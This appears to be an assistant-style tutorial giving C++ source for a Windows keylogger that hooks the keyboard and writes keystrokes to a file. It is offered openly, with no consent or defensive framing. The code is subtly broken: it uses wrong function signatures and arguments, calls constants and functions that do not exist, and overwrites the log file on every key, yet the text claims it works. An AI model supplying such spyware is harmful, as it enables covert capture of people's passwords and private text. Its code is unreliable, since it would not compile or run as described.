To create a program that logs keystrokes on a Windows computer, you can use the Windows API's keyboard hooking technique. Here's a detailed step-by-step guide:

### Step 1: Include Necessary Headers

Include the required Windows header files:

```cpp
#include <windows.h>
#include <windowsx.h>
#include <iostream>
#include <fstream>
```

### Step 2: Define the Keyboard Hook Function

Define a function to handle keyboard events:

```cpp
void KeyboardHookProc(HWND hwnd, int nCode, UINT wParam, LPARAM lParam)
{
    if (wParam == WM_KEYDOWN) {
        // Handle key press
        char key = static_cast<char>(lParam & 0xFF);
        std::ofstream file("keylog.txt");
        file << key << std::endl;
    }
}
```

### Step 3: Set Up the Keyboard Hook

In the main function, set up the hook:

```cpp
int main()
{
    HHOOK hook = 0;
    hook = SetWindowsHook(WH_KEYBOARD_LL, KeyboardHookProc);
    if (!hook) {
        std::cout << "Failed to set keyboard hook." << std::endl;
        return 1;
    }

    HWND hwnd = CreateWindowEx(0, "Keylogger",
        WS_DDESTOPPED | WS_VISIBLE | WS_MINIMIZE);

    if (!hwnd) {
        std::cout << "Failed to create window." << std::endl;
        return 1;
    }

    // Register the window class for message processing
    RegisterClass(hwnd, WND_CLASSDEFAULT);

    // Start the message loop
    MSG msg;
    while (GetMessage(&msg, hwnd, 0, 0)) {
        if (msg.message == WM_KEYDOWN) {
            if (msg.wParam == VK_KEYDOWN) {
                KeyboardHookProc(hwnd, msg.nCode, msg.wParam, msg.lParam);
            }
        }
        TranslateMessage(&msg);
        DispatchMessage(hwnd, msg);
    }

    // Clean up
    UnhookWindowsHook(hook);
    DestroyWindow(hwnd);
    PostQuit(hwnd);
    return 0;
}
```

### Step 4: Compile and Run

Compile the code using a compiler like Visual C++. This code will log each key press to a file named "keylog.txt" in the same directory.

